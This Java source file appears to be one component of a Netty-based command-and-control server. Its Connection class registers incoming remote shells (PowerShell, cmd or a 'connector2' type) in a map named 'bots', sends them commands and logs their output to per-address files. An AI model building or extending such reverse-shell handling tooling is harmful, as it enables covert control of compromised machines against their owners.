package netty.server;

import io.netty.channel.ChannelHandlerContext;
import lombok.Getter;
import lombok.Setter;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

@Getter
@Setter
public class Connection {
    private int id;
    private boolean alive = true;
    private ChannelHandlerContext ctx;
    private PrintWriter printWriter;
    private boolean printOutput = false;
    private boolean blockOutput = false;
    private boolean saveOutput;
    private ShellType shellType = null;

    public Connection(ChannelHandlerContext ctx, int id, boolean saveOutput) throws IOException {
        this.ctx = ctx;
        this.saveOutput = saveOutput;
        if(this.saveOutput){
            String fileName = "logs/" + ((ctx.channel().remoteAddress().toString() + ".txt").substring(1));
            this.printWriter = new PrintWriter(new FileWriter(fileName));
        }
        this.id = id;
    }

    public void send(String msg) throws UnsupportedEncodingException, InterruptedException {
        this.ctx.channel().writeAndFlush(msg);
    }

    public void write(String msg) {

        if(shellType == null){
            if(msg.charAt(0) == 'p'){
                shellType = ShellType.powershell;
                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
            }else if(msg.charAt(0) == 'c'){
                shellType = ShellType.cmd;
                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
            }else if(msg.charAt(0) == '2'){
                shellType = ShellType.connector2;
                Data.bots.put(ctx.channel().remoteAddress().toString(), this);
            } else{
            }

        }

        if(printOutput){
            try {
                System.out.println(msg);
            } catch (Exception ignored) {
            }
        }

        if(saveOutput){
            this.printWriter.write(msg);
            this.printWriter.flush();
        }
    }


    public void showInfo() {
        System.out.println(ctx.channel().remoteAddress()+"   "+shellType.name());
    }
}
